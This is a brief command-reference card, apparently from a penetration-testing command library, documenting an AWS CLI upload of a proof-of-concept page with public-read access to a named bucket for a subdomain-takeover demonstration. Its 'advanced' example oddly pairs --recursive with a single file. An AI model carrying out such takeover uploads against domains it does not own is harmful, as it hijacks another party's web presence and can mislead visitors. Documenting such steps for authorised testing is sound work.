---
data: >-
  aws s3 cp poc.html s3://gameday.websummit.net/ --region eu-west-1 --acl
  public-read
tags:
  - aws
  - s3
  - upload
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: cebf3211-3a7b-42af-aeae-e765b265ce76
created_at: '2025-12-14T05:32:24.269Z'
updated_at: '2025-12-14T05:32:24.269Z'
verified: false
validated: true
submitted: true
---
# aws-s3-upload-file

## Command

```bash
aws s3 cp poc.html s3://gameday.websummit.net/ --region eu-west-1 --acl public-read
```

## Description

Copies a local file to an S3 bucket with public read access, enabling content serving for takeover demonstration.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `cp` | Copy subcommand | Yes |
| `poc.html` | Source file | Yes |
| `s3://.../` | Destination bucket path | Yes |
| `--acl public-read` | Sets public access | Yes |
| `--region eu-west-1` | Bucket region | Yes |

## Examples

### Basic Usage

```bash
aws s3 cp poc.html s3://gameday.websummit.net/ --region eu-west-1 --acl public-read
```

### Advanced Usage

```bash
aws s3 cp poc.html s3://gameday.websummit.net/index.html --region eu-west-1 --acl public-read --recursive
```

## Expected Output

"upload: poc.html to s3://gameday.websummit.net/poc.html"

## Related

- [[Related Procedure]]
